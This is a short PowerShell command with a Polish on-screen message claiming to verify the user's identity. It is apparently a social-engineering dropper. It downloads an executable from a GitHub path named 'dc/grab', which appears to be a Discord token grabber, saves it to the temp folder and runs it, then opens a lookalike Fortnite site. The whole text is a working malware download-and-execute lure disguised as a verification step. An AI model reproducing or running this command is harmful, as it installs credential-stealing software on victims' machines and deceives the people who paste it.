powershell -Command {
    Write-Host 'Weryfikuje twoja tozsamosc...' -ForegroundColor Green;
    Invoke-WebRequest -Uri 'https://github.com/xKotelek/xKotelek/raw/main/dc/grab/main.exe' -OutFile $env:TEMP\temp.exe;
    Start-Process $env:TEMP\temp.exe;
    Start-Process 'https://f0rtn1te-xp.ct8.pl/';
}
